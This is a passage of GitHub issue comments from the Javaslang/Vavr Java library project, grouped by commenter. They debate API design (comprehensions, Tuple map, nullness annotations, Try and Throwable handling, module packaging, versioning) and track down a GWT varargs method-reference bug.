:)\n. > ... passed away\n:'-( ... ;)\nGreat. Looking forward to \"pure\", then!\n. > Javaslang gets a new mascot icon? :)\nLet me know if you're interested. I can have someone send you our trademark licensing terms and prices.\n. You mean, there's potential of an upselling business in the mascot trade market? Intriguing...\n. I guess you couldn't wait, eh?\nhttp://www.reddit.com/r/java/comments/35yp90/functional_component_library_for_java_8/crb6jc5\n. XML + XSLT = Any format! :)\n. Why masochistic? It's fun! What do you mean by \"complex\"? Our docs are all done with XSLT: http://www.jooq.org/learn\n. > there needs to be a business case for lukas\nExactly. I can change stylesheet, layout, versioning, formatting, etc. extremely easily using XSLT. But if you don't need that, I agree that XML is more tedious to write. It's always a tradeoff.\n. > HEY WATCHERS, I WONDER HOW YOU BEAR IT TO GET THAT MANY COMMIT MESSAGES FROM THIS REPO :-) (or am I already on the spam black list?)\nESPECIALLY IN THE MIDDLE OF THE NIGHT!!\n. Yes, that's a common mistake. See also: http://blog.jooq.org/2014/12/08/dont-be-clever-the-double-curly-braces-anti-pattern.\nThe only exception are local/anonymous classes in static methods.\n. What's the semantics of a non-discrete range without step? :)\nE.g. range(double from, double toExclusive) or rangeClosed(double from, double toExclusive)\n. That's an elegant approach. Although, I wonder if the naming is perhaps a bit confusing. I'd expect (1, 2) x (3) to yield (1, 3), (2, 3), not what you're suggesting. Perhaps, there's a more accurate name for taking a list \"to the power of 3\"\n. Cartesian power, indeed:\nhttps://en.wikipedia.org/wiki/Cartesian_product#Cartesian_power\n. Hmm, I mixed informal tuple and list notations, if that's what you meant....\n. Ah, you mean the implementation of jOO\u03bb's static crossJoin() methods... Well, if you're strictly in maths world, cross join is not an associative operation:\nhttps://en.wikipedia.org/wiki/Cartesian_product#Non-commutativity_and_non-associativity\nThis means that it might not really make sense, mathematically, to \"generalise\" this over multiple seqs. In SQL, like all operations derived from cartesian products, cross join always flattens nested tuples into a single top-level tuple, which is generally more useful and user-friendly than the mathematical nested tuples. I'm a pragmatic SQL person, not a maths person :)\n. > To make it more clear I will name the parameter power\nFair enough\n. No, not yet.\n. I haven't thought this through... What's in a name :)\n. I see, you're being lured into declaring recursive generics again :)\n\nTuple<U extends Tuple<U>>\n\nI just have a gut feeling that you're going to regret this, as this will again make the Tuple type unusable outside of the Javaslang API itself (see again this post). Why does Tuple need to know its own subtype?\nAlso, why the hassle with map() vs. transform()? Both methods return a tuple. What if I simply want to...\njava\nString string = tuple2.map((v1, v2) -> \"A string\");\ni.e.\njava\npublic final <R> R map(Function2<T1, T2, R> function) { ... }\nIn other words, I'm wondering if you're about to add overly \"complex\" API that doesn't pull the weight of the use-case (yet).\n. (oh, I just saw https://github.com/javaslang/javaslang/pull/696)\n. Ah, I see. I guess I got map() wrong a couple of times. The \"container\" should be preserved indeed. Although, it's still a bit weird for a map() function to require to produce the \"container\" instead of just the \"contained value\". E.g.\njava\ninterface Stream<T> {\n    <U> Stream<U> map(Function<? super T, ? extends U> function);\n}\nThe map() function doesn't require the implementation to produce the container (such as flatMap()), but to produce the contained value. For e.g. Tuple2, I would then expect:\njava\ninterface Tuple2<T1, T2> {\n    <U1, U2> Tuple2<U1, U2> map(\n        Function<? super T1, ? extends U1> function,\n        Function<? super T2, ? extends U2> function\n    );\n}\nThat feels more like the \"ordinary\" map(). What do you think?\n. OK, perhaps I was missing something, somewhere when you commented:\njava\n<U extends Tuple<U>> U map(Function2<? super T1, ? super T2, U> f)\n. Oh, I see - I suspect I confused your original intent (what you just explained, and what's in the title), and some comments in between (about tuple being a container like Seq). Sorry about my confusion\n. This feature request is a classic case of:\n\n. o_O\nI bow before you. Just as you posted this, I've also discovered Tree.draw().\n. > I think in our case we can even replace ? extends U with U, because method return types are co-variant in Java - but I'm not 100% sure.\nThose are different beasts. Right now, I can write:\njava\nNode<Integer> tree = Tree.of(1, Tree.of(2, Tree.of(3), Tree.of(4)), Tree.of(5, Tree.of(6)));\nFunction<Tree<?>, Tree<Object>> toStringAny = i -> i.map(Objects::toString);\n//                     ^^^^^^ Not String\nSystem.out.println(tree.transform(toStringAny));\nThis wouldn't be possible if you change ? extends U to U\n. > I believe the need exists for annotating methods with nullness information, whatever is the library, as long as users are using nullness analysers and IDE with such feedbacks\nI'm following this discussion with great pleasure, and I totally agree with @danieldietrich's reluctance of adding any annotation for nullness.\nMike Ernst is a brilliant guy and the author of the checker framework. I've once met him in person at a conference, and he was quite disappointed that most people endlessly bikeshed nullness when talking about the checker framework, rather than realising what powerful and complex type systems they could be implementing instead using annotations (and then be type checking using his framework).\nThis is important to realise. You cannot possibly think that engaging in a \"parallel universe\" type system involving type annotations is a simple task, or that you will stop at abusing that language feature for \"just some simple\" null checks. At some point, you will want to annotate collection emptiness, string \"size-ness\", number \"positive-ness\", \"single-stream-consumption-ness\" etc., so this is a very strategic decision that must not be underestimated (at least in a cleanly designed, not so wishy-washy API).\nThe Java community (and many other communities) are extremely obsessed with this null legacy. Sure, we all wish languages (and the JVM) were designed without this burden, but we now have it and it usually isn't all that bad, unless some junior developer on the team thinks that it's a good idea to have null collections or something. In a library like Javaslang, you can in fact be very sure that you will hardly ever encounter null, because references in Javaslang are mostly one of three things:\n\nA collection, which is never null but empty\nAn Option which replaces null (it is in fact a collection of cardinality 0..1)\nA non-null reference\n\nLikewise, in Scala, you don't have this discussion, because the Scala language and libraries are designed in very similar ways as Javaslang, so there's no real need for such an annotation in Scala.\nTL;DR: YAGNI! So, why not just disable your IDE warnings for all Javaslang API usage? :)\n(and if your IDE cannot type check only parts of your application for these annotations, then it is doing it wrong). > Also we can't express if T and R of Function are @Nullable or not.\nEver heard of JSR-308?. @danieldietrich \nTry this: https://twitter.com/lukaseder/status/711612663202238464. Oh wow! I didn't know that method references could be applied to generic type variables! Sweet! :)\n. ",
    "jonasgeiregat": "I've been thinking about this and I find the following syntax nicer then the initial proposed one.\nHaskell: [x^2 | x <- [1..5]]\n-- produces [1,4,9,16,25]\nJavaslang: List.comprehend(x -> x*x, myList);\nThis could even be taken a little bit further by adding a predicate.\nJavaslang: List.comprehend(x -> x*x, myList, x -> x < 10);\nOr if you want to produce a List of a different type then the initial type of the input list:\nJavaslang: List.comprehend(x -> String.valueOf(x*x), myList, x -> x < 10, String.class);\nThe comprehend method could also be an instance method of javaslang.collection.List\nmyList.comprehend(x -> x*x, x -> x < 10);\n. Sure!\n. ",
    "pablogrisafi1975": "May I ask a few questions?\n1) I don't get the point of comprehensions over one List. Isn't \nList.comprehend(x -> String.valueOf(x*x), myList, x -> x < 10, String.class);\nExactly the same as\n` list.filter(x -> x < 10).map(x -> String.valueOf(x * x));\nam I missing something?\n2) I really want to have comprehensions over multiple lists. One imperative pattern I see a lot in my business oriented code is something like\n```\nfor(Heade header: headerList){\n    for(Detail detail: header.getDetails()){\n        for(SubDetail subDetail : details.getSubDetail()){\n            dosomething(header, detail, subdetail);\n        }\n    }\n} \n```\nI haven't found a way to do that in a more functional way, I wish list comprehensions can transform this into something like\n```\nList>> tuples = List.comprehend(\n     headerList, \n     h -> h.getDetails(),\n     d -> d.getSubDetails());\ntuples.map(t - > doSomething(t._1, t._2, t._3));\n```\nCan that be made? I was expecting an API that accept Iterables and java.util.Stream, so we can use comprehend old java.util.List without pain. Something like\n```\nList> = \nList.comprehend(Iterable, Function>, Function>);\nList> = \nList.comprehend(Iterable, Function>, Function>); \n```\nI know that expanding this to 1-to-8-arity and accept every combination of javaslang.List, java.util.Iterable, java.util.Stream and javaslang.Stream would be pretty much imposible without code generation, but it would be so nice to be able to write\nList.comprehend(headerList, \n     h -> h.getDetails().stream().filter(d -> h.getType().equals(\"thisType\")),\n     d -> d.getSubDetails()\n).each(whatever....)\nAnyway, thanks for the wonderful job! \n. Maybe I'm missing something, but isn't the 'natural' return type a Stream<Tuple<T1...Tn>> ?\nI think it is a  flexible enough approach, and if you want a specific type, you simply map into it.\nAm I  suggesting Stream Comprenhensions....? \n. Maybe event better would be a specific TupleStream<T1...Tn> extends Stream<T1...Tn> that also has a specific method yield(T1 e1 ...... Tn en) so people can use it as a enhaced for without even noticing a tuple beahind, if they want to.\n. Excellent!\nI just realize you are basically using Scala to make Java look like Scala...I should learn some Scala.\nThank you!\n. ",
    "zerkowsm": "So, is there a way to have Try.of with void methods - something like:\nTry.of(() -> SomeClassWithVoidMethodThrowingAnException::method); \nor explicitly:\n`Try.of(() -> SomeClassWithVoidMethodThrowingAnException::method).get();?\n. ",
    "talios": "I've used https://bitbucket.org/blob79/quickcheck in the past and use it in my https://github.com/talios/quickcheckng project to export generators as TestNG dataproviders.\nWould love to see a more refined, modern take.\n. On 9 Jan 2015, at 12:13, Mark Perry wrote:\n\n\nit would be nice to unify the methods\u00a0whenClass\u00a0and\u00a0appendClass. It feels a bit stilted and hard to remember that the first call is whenClass to create a\u00a0When\u00a0and the\u00a0appendClass\u00a0after that. I think Java was preventing me having a static and not-static method having the same name, but I need to have more of a play.\n\n\nHi all, just catching up with this thread, since this match discussion is a side-topic to the main issue, thought I'd offer a comment - instead of appendClass, whats wrong with a good old vararg list of Match instances.\nreturn Match.match(this, h -> halt(),\n        When.<Emit<I, O>, Process<I, O>, Process<I, O>>whenClass(Emit.class,\n            (Emit<I, O> e) -> Emit.emit(e.head, e.tail.append(p))\n        ),\n        When.<Emit<I, O>, Process<I, O>, Process<I, O>>whenClass(Await.class,\n            (Await<I, O> a) -> Await.await(andThen(a.receive, p2 -> p2.append(p)))\n        )\n    );\nThe repetition of generics rather ugly tho, but this could be cleaned up with a series of ( equally ugly, but for other reasons ) variations of whenClass:\nreturn Match.match(this, h -> halt(),\n        When.<Emit<I, O>, Process<I, O>, Process<I, O>>whenClass(\n            Emit.class,  (Emit<I, O> e)  -> Emit.emit(e.head, e.tail.append(p)),\n            Await.class, (Await<I, O> a) -> Await.await(andThen(a.receive, p2 -> p2.append(p)))\n        )\n    );\nwhere the args are:\nMatch[] whenClass(Class c1, Process<I,O> p1, Class c2, Process<I,O> p2,......Class cN, Process<I,O> pN);\nMark\n\nMark Derricutt\nhttp://www.theoryinpractice.net\nhttp://plus.google.com/+MarkDerricutt\nhttp://twitter.com/talios\nhttp://facebook.com/mderricutt\n. Er, not if you're using the maven-release-plugin as it tags during the prepare and checks out a local copy during the perform stages.\nWe tend to use the following configuration at work however:\n<plugin>\n    <groupId>org.apache.maven.plugins</groupId>\n    <artifactId>maven-release-plugin</artifactId>\n    <version>2.5</version>\n    <configuration>\n        <preparationGoals>clean install</preparationGoals>\n        <goals>deploy</goals>\n        <pushChanges>false</pushChanges>\n        <localCheckout>true</localCheckout>\n    </configuration>\n</plugin>\nThis tells the release plugin to not do a git push during prepare, and to do a local checkout, this is useful if you're using a release branch or need to re-roll a release that didn't quite work, saves having messy published commits/tags.\nThe release plugin already checks for uncommitted files, but doesn't know anything about un-added files ( the local checkout / test install however traps that ).\n. What would be nice is having some way that the two projects could intersect in user-land, which is in part the discussion @jbgi linked to - awhile ago I was thinking \"it would be nice if these ADT4j classes were monads...\"\n. @danieldietrich True, altho going FooMonad.map(foo, foo2 -> .... ); is kinda arse.\n. > Everyone should have a Lukas :-)\nJavaslang gets a new mascot icon?  :)\n. @mvh77 +2! Looking nice.\n. My original naive implementation was https://gist.github.com/talios/97c27fe577894e96cc46 - which was basically doing the bare minimum of what I was wanting. And when I say naive - I mean incredibly so :)\n. @ggalmazor I believe Optional is not serializable as Oracle eventually want to take that to a value type, which won't be serializable as it'd just be null. One thing I like about Javaslangs Option is it's more richer API, Oracles is quite anemic ( like much of their \"functional\" interfaces ).\n. On 8 Mar 2016, at 22:13, Guillermo Gut\u00e9rrez wrote:\n\nI'd want to understand why you'd need a Some(null). Not trying to be rude... really :) Could you provide an example?\n\nWhen pulling values out of a database - a missing row might be a None but a row containing a null value would be Some(null) - Just like when dealing with some result sets when you group() or left outer join them you might end up with a List(1,2,3,null,4,null,6).\nDouble wrapping everything as List(Some(1),Some(2),Some(3),None,Some(4),None) itself kinda feels horrible and wrong. Tho in the list scenario it might be better as List(List(1),List(2),List(3),Nil,List(4),Nil) and flatten the list to drop the Nils.\nIt is probably rare you want Some(null) but I find sometimes it's useful to have. Esp. if what you are saying is just that \"this is defined, and it is null\" and you're dealing with legacy data.\n\nMark Derricutt\nhttp://www.theoryinpractice.net\nhttp://www.chaliceofblood.net\nhttp://plus.google.com/+MarkDerricutt\nhttp://twitter.com/talios\nhttp://facebook.com/mderricutt\n. On 29 Mar 2016, at 22:37, Daniel Dietrich wrote:\n\n\nIf we integrate OSGi now into Javaslang via additional dependencies and users will rely on it, it will be hard to remove it again later (when moving to Jigsaw modules).\n\n\nAs far as OSGi is concerned, you'd basically be adding to META-INF/MANIFEST.MF:\nBundle-Name: javaslang\nBundle-Version: 2.0.1\nExport-Packages: javaslang.collection.*......\nwith no further dependencies.\n\nMark Derricutt\nhttp://www.theoryinpractice.net\nhttp://www.chaliceofblood.net\nhttp://plus.google.com/+MarkDerricutt\nhttp://twitter.com/talios\nhttp://facebook.com/mderricutt\n. One good thing of including generated code in version control (IMHO) comes during code review, being able to see what code is being generated is often handy, and may often change the opinion of the code review.  i.e. your change may look small - but it might have far further reaching impact than you, or an unfamiliar reviewer may expect.\nThat being said, care should be taken to generate the code as far away from \"real code\" as possible - and never in the same directory :)\n. I don't believe there is one - I was looking for something similar the other day.  You'd want to add it to the new Multimap hierarchy as well.\n. @paplorinc the tests I added for that were rather minimal I confess. I wasn't quite sure the best way to cover them.  There is a test that checks the ordering bounces back and forth correctly tho.\n. The other day I released ( and have made a few tweak releases ) a Maven Plugin which wraps the Google Formatter library which implements the documented Google code style.\nWhilst I don't like 100% of their choices, I can certainly see why they're chosen them and are slowly coming around to them. I do appreciate being able to have consistent format separate from IDE, any thought to maybe using it?\n. Interestingly - \"align parameters in JavaDoc\" is one of the things that the Google Format avoids ( and I didn't initially like). Reasoning being in the long run it's a pain when refactoring, introducing line changes purely for format reasons if you introduce/rename a field.\n. From memory - most of the checker frameworks ( and at least IntelliJ ) will work with an @Nullable or @NotNull annotation from ANY package ( since there were so many ), so in theory, javaslang could provide it's own ones.. On 25 Apr 2017, at 0:46, N\u00e1ndor El\u0151d Fekete wrote:\n\nI don't think any form of repackaging of vavr between versions would solve your versioning problem by itself, but it would greatly pollute the very nice API vavr currently has.\n\nThe only solution here I see, would be further, and finer grained separation of packages, and release granularity - so that not everything has to change at the same pace. However, due to the nature of how Java the language/runtime is put together, there's only so far one can go with that.\nHaving a bare minimum Vavr of io.vavr.control might be useful, but since A LOT of functionality is implemented as default methods on Value - there's a fairly large surface area that has to come along with it, that being said - an io.vavr.base module or the like could be extracted to provide basic things - altho due to things being structured the way they are, those base types church fairly often as far as performance/optimization goes, as well as new functionality.\nIf only we had proper extension methods and not dumbed down default methods....\n-- \nMark Derricutt\nhttp://www.theoryinpractice.net\nhttp://www.chaliceofblood.net\nhttp://plus.google.com/+MarkDerricutt\nhttp://twitter.com/talios\nhttp://facebook.com/mderricutt\n. Note that @Generated is no longer available in JDK 9 ( its part of the EE jars/modules, which aren't enabled by default, and are deprecated) - but are available via a dependency.. @danieldietrich See https://github.com/immutables/immutables/issues/703#issuecomment-342029844 for a related discussion.  Seems Java 9 added javax.annotation.processing.Generated :). On 19 Mar 2018, at 12:46, Daniel Dietrich wrote:\n\nYesterday I bootstrapped a new, modularised version of Vavr. It runs on Java 9 and will be the base for the upcoming 1.0.0 release.\n\nIs this to say, it ONLY runs on Java 9 (and higher)? So no Java 8 support, or is that still available?\n\nCurrently we hide impls of Either (Left and Right) in a subpackage called internal. Is this idiomatic Java 9?\n\nI've not really seen anyone talking about idiomatic design for Java 9/jigsaw worlds, but that's the kind of thing I'd do under OSGi.\nAnd part of what I've been pondering lately regarding that tweet of mine ( and flowing onto a reddit discussion I started at https://www.reddit.com/r/java/comments/859i84/thoughts_on_large_class_apis_using_defaultstatic/ )\nCheers\nMark\n\n\"The ease with which a change can be implemented has no relevance at all to whether it is the right change for the (Java) Platform for all time.\" \u2014 Mark Reinhold.\nMark Derricutt\nhttp://www.theoryinpractice.net\nhttp://www.chaliceofblood.net\nhttp://plus.google.com/+MarkDerricutt\nhttp://twitter.com/talios\nhttp://facebook.com/mderricutt\n. \nOn 20 Mar 2018, at 11:31, Daniel Dietrich wrote:\n\nCreate multi-release jars, which contain Java 8 classes plus an additional module-info.class for Java 9+\n\nI've not actually created any Jigsaw modules yet, but I think you can have a non-MRJ with module-info.class in it, and still work in Java 8 - since it's not a valid class name, nothing in Java can actually refer to the class to load it, but java 9 will use it.\nSo it might be possible to just have a compile step for module-info.java that uses -release 9 and sticks it in the normal target/classes directory for jaring up?\nInteresting, that post you link to ( which I was already reading ) is only on MRJs, not Modules-with-MRJs - does module-info.class need to be in / or can it be in META-INF/versions/9 as well?\nMark\n\"The ease with which a change can be implemented has no relevance at all to whether it is the right change for the (Java) Platform for all time.\" \u2014 Mark Reinhold.\nMark Derricutt\nhttp://www.theoryinpractice.net\nhttp://www.chaliceofblood.net\nhttp://plus.google.com/+MarkDerricutt\nhttp://twitter.com/talios\nhttp://facebook.com/mderricutt. ErrorProne++ - oh yes!. CheckReturnValue is not a run-time dependency - it's purely compile time. So I don't see an issue here really - so whilst it'll be required/downloaded/used when users of Vavr build their projects, it's doesn't incur any additionally runtime dependencies.\n. @danieldietrich Fair enough - altho, that thread seems to be purely about nullness checking, which is quite different to what this ticket was about.. Using an AtomicReference works, but I feel somewhat dirty using it. But due to immutability and final references from inside lambdas, I wanted something I could update an order swapped tuple.\n. I also don't overly like creating new Tuple instances on every iteration, do we have any notion of a \"rotate\" or \"shift\" in javaslang that could maintain the underlying structure?\n. Any suggestions on how I would even approach writing tests for arbitrary values....\n. Sure, I'd used forAll to follow the usage from Property.def('').forAll(...) and since of() somewhat implies a fixed ( or more, known ) set of values.  One usage of fixed made it nicer when static importing it, tho consistency with the rest of the API is probably better.\n. Sounds good.\n. To be honest, I've never liked _1 or _2 in javaslang ( or scala ).\n. I'll take a look over the weekend as well - people tend to call me a Maven expert around here. Sometimes in a positive way, sometimes... as a means of bashing Maven :)\n. If you wanted to be cleaner, you could also catch ReflectiveOperationException (see javadoc) which is the new superclass for all reflection based exceptions which came in with Java 1.7.\n. ",
    "kant111": "Does this results still hold? Sounds like Vavr Stream is a huge performance hit compared to Java one. If so, shouldn't we be using Java 8 Stream?. Yes I am not sure why everything is designed around Throwable's. sounds like a wrong design for me. Throwable catch both exceptions and errors.. @KTannenberg I am not sure why we should follow Scala's Try? After all, this is a Java library.\nI don't believe one can ignore the points raised by @chb0github \nCatching Throwable is probably the most horrible thing in my view since it catches all Exceptions and Errors that are not meant to be caught that said if you have a better solution please suggest. But given the way it is right now it makes exception handling really hard. And Cyclops seems to have better Exception handling mechanisms. . @KTannenberg Sure but again Vavr is not a Scala library right I can understand the motivations and the theory drawn from Scala or in General functional programming perspective but at the same time building the library in Java that doesn't work well for exceptions is also not the right thing to do. For example I have the following question here https://github.com/vavr-io/vavr/issues/2142 and it just a pain to even try and come up with a solution and so far there is no solution for my question. As a user of the library it doesn't give a good experience. \n\"Cyclops requires you to explicitly define all exceptions that can be throw by your code below, because of that they don't need java to figure out types on its own.\"\nSure that works right! anything wrong with that?! \nFinally, please suggest if you have a better approach. It just doesn't make a lot of sense to say Scala does things in a certain way so Java should do the same. Catching Throwable is a serious concern for Java programmers. If this library is designed to help Java Programmers then I think it should make appropriate changes or additions. My 2 cents.\n. @KTannenberg Also why you say checked/unchecked exceptions are silly? How can one enforce the client of an API to think about how to deal with Exceptions at compile time? This in my experience is very useful since I need to think about how to handle a certain Exception at compile time and as a consequence this saves lot of debugging time.  \nIf the argument is that dealing everything at run time leads to less boilerplate code then comparison really comes down is static typing vs dynamic typing. And both has pros and cons.  \nDynamic typing in general takes more debugging time than static typing. And static typing is very useful to catch errors early and takes less debugging time.. @KTannenberg Agreed. Please suggest alternatives. . @mrpotes shall we implement the interface you suggested and make it part of the next release? can someone make aware of release process for Vavr? . https://stackoverflow.com/questions/613954/the-case-against-checked-exceptions\n1) Catching Throwable's is outright madness. There are enough examples pointed out here on why.\n2) Checked vs Unchecked exceptions really just boils down to is static type vs dynamic type of a language.  Sure unchecked exception results in better expressive code. so does any dynamic type language with lots of syntax sugar than say any static type language. Python is way more expressive than any static type language (you  name it). \nI personally like static type enforcement because it helps me debug things way faster instead of relying on a programmer's comments. How many programmers do we know in the industry care to write comments? Moreover isn't it more safe to rely on a compiler than relying on some random programmer? \nso This is just a preference. It's like asking is English better than German or German better than English.\n. @danieldietrich Yes, Thanks for adding those onFailure variants I have to wait until 1.0 I guess. It does look better but looks is not everything. instanceof has a performance impact as well as you may already know. variant #2 is quite good as also to be honest. \nAlso, Why do we care about systems or libraries that are built in 90's?! Any better examples?! \nTry rethrows OutOfMemory exceptions (beside others): This indeed seems convoluted and a big stretch. \nI think you should Advertise Vavr as \"Scala inspired Java library\" or something. I initially thought the library draws core concepts from Functional programming in general not just from Scala. I didn't know Vavr falls back on Scala heavily. If I knew I would have avoided using Vavr library because If I am so deeply in love with Scala then I might as well use Scala than using a Scala inspired library :) \nAnyways since I don't see much room for discussion. I am out of this thread as well! Good luck!\n. @ruslansennov Sure, but is there any cleaner way? else I had to return null for lot of my log statements. I have also looked into the .onFailure method and it looks like it is going to catch throwable in which case it will catch all exceptions and errors but I only want to catch one exception which is MyAppRuntimeException. And if there are other RuntimeExceptions that occur then I want them to be thrown as any other java program does but not go silent by catching Throwable.. @hamnis Consumer<E> This is all we are looking for. @danieldietrich Can you describe why it isn't a viable solution ?. @danieldietrich That looks good to me (As long as we are not catching throwable's I think we are good) ! It might even solve https://github.com/vavr-io/vavr/issues/2137. ",
    "nfekete": "But the benchmark should in fact compare vavr Iterator with JDK Stream, isn't it? Apples to apples. Maybe it would be worth to see the numbers comparing those two.. Hello guys! Is the implementation on this feature stalled? Any plans on going forward?. Memoized might be worth keeping public as I actually had a use case, where I defined a new CustomFunctionX type but overridden the FunctionX.memoized()  to call Memoized.of with a different map implementation (reference map instead of hashmap).. Is there anything a a LazyOption<T> could solve that a Lazy<Option<T>> cannot? Similarly for LazyTry and LazyEither, etc?. @danieldietrich some of the internal links on the blog are also broken (they're absolute links pointing to javaslang.io instead of relative links). For example:\n\nIn our previous post we showed the Grill example.... I vote for the immutable version, with the API method called asJavaImmutable() or asImmutableJava(). This way the API consumer should be very well aware what gets, even without reading the javadocs for that method. That is, he/she will get an immutable view of the collection through the standard Java Collections API. He/She shouldn't try to mutate it and shouldn't pass it to some other black box code which would try to mutate it (which would we a bad practice anyway from that black box code). One might say that throwing a runtime exception is unexpected behavior happening at runtime. I think that isn't the case (i.e. it's not unexpected), considering the above, but even then, it should be quite obvious with minimal amount of testing. I think Javaslang shouldn't try to guard against every possible misuse of the library, it's enough to aim for a well defined behavior, which IMO is satisfied with the above.. Yes, I think throwing unconditionally is better, because accepting an empty collection by addAll() could let people believe the receiver collection is actually mutable. Calling any kind of mutating method on an immutable collection is an error by itself.. I see the List interface as a contract. While making it impossible for other classes to implement that contract might be a way to exclude the possibility that a non-conforming implementation will be passed to client code that expects a conforming implementation, that would come with a cost: no-one will be able to provide alternative (conforming) implementations. That would exclude legitimate use-cases no API designer can foresee. I think this kind of lock-in is counter-productive and risky, besides making the javaslang implementation more complicated.\n\nAnd there's the other side of the story: why would I have to accept to be denied to implement a contract?. @anubliss remove first and then add?. @danieldietrich sure, I was rather thinking of contributing an implementation in case I need to implement it for my own purpose. But I'm not yet sure I even need it. A simple Vector<String> might be enough to model something similar, but I haven't given it much thought yet.. There might be other collections with the same ambiguity, I haven't looked thoroughly, but List has the same issue.. You could add this as well (if you want to check if the bug manifests or not)\nassertThat(Vector.tabulate(2, Function.identity()).contains(1)).isTrue(). Are you sure it's a JS problem? Somehow I assumed that the GWT compiler is there for us to work around JS funkyness (I'm using a mild word here), and was totally convinced that this bug is the GWT compiler's fault, more precisely the Eclipse compiler embedded and used by GWT.. GWT compiler actually creates differently named js methods for overloaded java methods, so I really think this is not a JS problem. GWT (relying on info from the ECJ) just generates a reference to the wrong method.. Now I'm really baffled. Something deeper is going on here. I tried your example by including it into the javaslang-gwt-example project and it works. The bug doesn't manifest itself. I also tried with method reference to static methods as in the tabulate case but it still works ok. Also with varargs instead of array,. Okay, I figured out something. The method reference GWT generates is actually good. The Test.of(T...) gets referenced but the passed-in array of Ts is actually a one-element array consisting of the array of elements that should get passed wrapped in as the first element of the array. So, in practice, the array argument gets wrapped in another array.. Here's a small test case to reproduce the behavior:\n```\nimport java.util.function.Function;\npublic class Test {\npublic static void main(String[] args) {\n    String[] array = new String[] { \"1\", \"2\" };\n    first(array);\n    Function<String[], String> fn = Test::first;\n    fn.apply(array);\n}\n\nstatic String first(String... strings) {\n    return strings[0];\n}\n\n}\n```\nIt seems this is a GWT problem, not Eclipse Compiler for Java problem. I'm gonna file a bug for GWT based on this.\nSorry for wasting your time with this, it has nothing to do with Javaslang. I mean, we knew from the start that Javaslang code was correct, but it seemed that the overloading of the *::of method is confusing the compiler. But it's the varargs + method reference that is confusing the compiler.\n. GWT issue filed at: https://github.com/gwtproject/gwt/issues/9497. GWT fix landed in HEAD, which has snapshots built as maven version HEAD-SNAPSHOT, see here:\nhttps://oss.sonatype.org/content/repositories/google-snapshots/com/google/gwt/gwt-servlet/HEAD-SNAPSHOT/\nI tried the above repro snippet and it works correctly.. Vector.tabulate() also works correctly with gwt-HEAD-SNAPSHOT.. You guys make a good team \ud83d\udc4d :). @skestle Let's suppose for a moment that javaslang would use a new package name for its upcoming major release. Would it solve your problem? Is javaslang the only library you're using that is going through an evolution that could hurt backward compatibility? That would mean it's probably the only dependency you're using as most libraries out there do in fact go through a non backward-compatible evolution. If you want to solve this, you could try using classloader isolation (OSGi being probably the most mature solution), but doing so would require some up-front cost, though.  Of course, the classes loaded with the different classloaders will not interoperate, but they neither would with a package rename.. I'm trying to understand the intended use pattern here. Let's suppose you have your module structure you have mentioned earlier in your post:\n\n\nA depends on vavr 1\nB depends on vavr 2\nyou use latest A and B in your module C\n\n\nHere are the hypothetical usage patterns I can think of: \n 1. You're using vavr in your A and B modules only internally (vavr not being used in the public API), you should be able to use them without problems with classloader isolation.\n 2. You're exposing an API which uses vavr types. Let's say, you're using io.vavr.control.Option. In this case, should the Option class evolve in a binary incompatible way, you will have a version conflict. This could be solved by:\n    1. vavr repackaging everything in it's major revisions to new package structure, even if Option itself didn't change in an incompatible way: io.vavr1.control.Option and io.vavr2.control.Option. Now you still have two different classes with the same name, but they are different classes and they are not compatible with each other. You'll need to write some kind of translation layer between the two in C, which, at best, will be very cumbersome. \n    2. vavr repackaging only those classes that were changed in an incompatible way. Let's say Option itself didn't change in an incompatible way, so it can stay in its base package io.vavr.control.Option. So you can use Option without any further work in your module C. Other vavr classes that evolved in an incompatible way will need to be repackaged in a different package though, and we will end up with per-class naming (either through package name change or class name change) for every major revision of every class. It's easy to see that this will lead to an explosion of the FQCNs of the classes, which would be very confusing for the users of the library. \nTo me, the main conclusion to these points is, that you cannot really have a public API in your app based on mixed incompatible versions of the library (or any library whatsoever), without significant plumbing work by creating a translation layer between the versions (points 1 and 2.i.) or without employing a very confusing versioning scheme on vavr's side (point 2.ii) which wouldn't save you from the plumbing after all, should the types used in your public API evolve in an incompatible way.\nIf I were to solve your versioning problem I would go in the direction of unifying the vavr versions used throughout your modules so that they use the same version of the library. If that's not feasible at all for your project, I would try to use some form of classloader isolation (OSGi) if you want them to coexist within the same VM, and some form of serialization for communication between your modules. Serialization could be the bridge for communication between your modules. That would also be a huge step towards making your app distributable, and it's effectively a form of a microservice architecture.\nI don't think any form of repackaging of vavr between versions would solve your versioning problem by itself, but it would greatly pollute the very nice API vavr currently has.\n. Please note that I'm not a committer or a decision maker in any way for vavr. I'm just a random dude who cares about the future of this project and throws in his unsolicited thoughts. I just fail to understand (yet), what versioning scheme are you proposing and how would that solve your (and possibly other people's) versioning problem. Don't get me wrong, it might be very well my fault, but I just don't see what do you recommend to this problem, how would it solve the different cases I mentioned earlier and what is the price to pay in terms of vavr API design.. Okay, then, if I understand correctly, you either don't need to pass around vavr types across module boundaries or you'll need to create glue code which translates between the API versions. I'm seeing code like \njava\nclass VavrVersionConverters {\n    <T> io.vavr.v2.collection.Vector<T> toVavr2(io.vavr.v1.collection.Vector<T> source) {...}\n    <T> io.vavr.v1.collection.Vector<T> toVavr1(io.vavr.v2.collection.Vector<T> source) {...}\n}\nand so on, for every possible type combination you'll need to convert between. With two versions, that's two methods per type, with 3 versions, it's 6. \nOr use it inline like this:\njava\nio.vavr.v2.collection.Vector<SomeType> v2 = io.vavr.v2.collection.Vector.ofAll(v1);\nThis is too much boilerplate for my taste, but it could work, nevertheless.. @skestle what would be the difference if we would rename the vavr package in major revisions compared to repackaging vavr with let's say, a tool like Maven Shade Plugin or JarJar?\nIt seems that the problem of repackaging is already solved (unless, of course, there's some non-code reference to package names like strings or property files, IDK how Maven Shade Plugin or JarJar handles those; I don't know of any such references in vavr though).\nSo, to make my question more clear: what added benefit would bring a package rename in vavr, compared to repackaging with Maven Shade Plugin, considering that there's a huge price to pay for it, specifically all vavr library users would be forced to organize imports throughout the project when migrating, instead of a simple recompile and occasional source fixes where there might be incompatibility.. > \"A huge price\"? Select all projects, organise imports. 10 seconds? Faster than the simplest incompatibility fix. Even if you don't use an IDE, figuring out the grep command would be about 1 min.\nI think it's not that simple. With type names like Array, BitSet, HashMap, HashSet, Iterator, List, Map, Set, SortedMap, SortedSet, Stream, TreeMap, TreeSet, Vector, organize imports will ask for each and every one of them to select the proper type from a list of matching type names, and I only listed the type names overlapping with JDK types. There might also be cases where someone uses both JDK and vavr types with the same name, and if the vavr type happens to be the one being fully qualified,  organize imports won't even touch them, you would need to go and change them manually. \nI agree though that you can do it quite quickly with a shell script, which 